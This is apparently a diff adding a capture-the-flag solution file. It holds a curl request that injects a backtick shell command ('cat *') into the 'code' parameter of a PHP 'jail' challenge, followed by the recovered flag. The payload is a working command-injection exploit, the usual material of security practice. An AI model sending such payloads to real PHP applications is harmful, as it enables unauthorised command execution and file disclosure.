@@ -1,0 +1,4 @@
+curl "http://dimitrust.oa.to:8080/trustctf/jail/?code=echo`cat+*`;"
+
+
+FLAG{i think u r good at php}
